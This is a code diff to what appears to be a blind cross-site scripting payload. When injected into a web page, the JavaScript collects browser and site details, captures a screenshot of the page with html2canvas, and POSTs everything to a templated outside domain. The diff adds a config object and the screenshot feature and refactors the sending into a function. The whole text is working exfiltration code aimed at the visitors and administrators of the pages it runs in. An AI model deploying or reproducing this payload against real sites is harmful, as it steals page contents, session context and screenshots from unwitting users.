@@ -1,3 +1,7 @@
+const config = {
+    domain: '{{DOMAIN}}',
+    screenshot_enabled: true
+}
 function collectBrowserAndWebsiteInfo() {
     const info = {
       // Browser core information
@@ -206,19 +210,32 @@ function collectBrowserAndWebsiteInfo() {
   
     console.log('Browser and Website Information:', info);
     return info;
-  }
-  
-  // Call the function to collect information
-  const browserInfo = collectBrowserAndWebsiteInfo();
-  
-  // To get the information as a JSON string
-  const jsonString = JSON.stringify(browserInfo, null, 2);
+}
 
-  // Send the information to bxss-server.localtest.me
-  fetch('//{{DOMAIN}}', {
-      method: 'POST',
-      headers: {
-          'Content-Type': 'application/json'
-      },
-      body: jsonString
-  })
+function sendInfoToServer(info){
+    // To get the information as a JSON string
+    const jsonString = JSON.stringify(info, null, 2);
+    fetch(`//${config.domain}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: jsonString
+    })
+}
+
+{HTML2CANVAS}
+  
+// Call the function to collect information
+const browserInfo = collectBrowserAndWebsiteInfo();
+
+// Screenshot
+if (config.screenshot_enabled){
+    html2canvas(document.body).then(function(canvas) {
+        // convert canvas into image
+        browserInfo['screenshot'] = canvas.toDataURL('image/png');
+        sendInfoToServer(browserInfo);
+    });
+} else {
+    sendInfoToServer(browserInfo);
+}
